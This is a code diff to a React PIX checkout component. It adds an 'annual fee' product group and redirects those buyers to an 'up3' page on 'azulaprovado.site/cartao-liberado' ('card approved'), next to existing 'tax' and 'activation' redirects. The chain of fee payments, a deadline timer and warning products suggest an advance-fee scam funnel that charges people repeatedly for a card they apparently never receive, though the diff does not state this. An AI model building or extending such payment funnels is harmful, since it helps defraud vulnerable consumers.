@@ -13,6 +13,7 @@ import {
   HEADER_TIMER_PRODUCT_IDS,
   ATIVAR_CONTA_PRODUCT_IDS,
   IOF_WARNING_PRODUCT_IDS,
+  TAXA_ANUAL_PRODUCT_IDS,
 } from "@/config/warningProducts";
 
 interface PixPaymentProps {
@@ -118,7 +119,9 @@ const PixPayment = ({ pixData, loading, onGeneratePix, email, cpf, total, fullNa
         localStorage.removeItem("checkout_form_draft");
         localStorage.removeItem("checkout_deadline_ts");
       } catch {}
-      if (ids.some((id) => ATIVAR_CONTA_PRODUCT_IDS.includes(id))) {
+      if (ids.some((id) => TAXA_ANUAL_PRODUCT_IDS.includes(id))) {
+        window.location.href = "https://azulaprovado.site/cartao-liberado/up3/";
+      } else if (ids.some((id) => ATIVAR_CONTA_PRODUCT_IDS.includes(id))) {
         window.location.href = "https://azulaprovado.site/cartao-liberado/imposto/";
       } else {
         window.location.href = "https://azulaprovado.site/cartao-liberado/ativacao/";
@@ -238,7 +241,9 @@ const PixPayment = ({ pixData, loading, onGeneratePix, email, cpf, total, fullNa
         localStorage.removeItem("checkout_deadline_ts");
       } catch {}
       const ids = (orderItems || []).map((i) => i.id);
-      if (ids.some((id) => ATIVAR_CONTA_PRODUCT_IDS.includes(id))) {
+      if (ids.some((id) => TAXA_ANUAL_PRODUCT_IDS.includes(id))) {
+        window.location.href = "https://azulaprovado.site/cartao-liberado/up3/";
+      } else if (ids.some((id) => ATIVAR_CONTA_PRODUCT_IDS.includes(id))) {
         window.location.href = "https://azulaprovado.site/cartao-liberado/imposto/";
       } else {
         window.location.href = "https://azulaprovado.site/cartao-liberado/ativacao/";
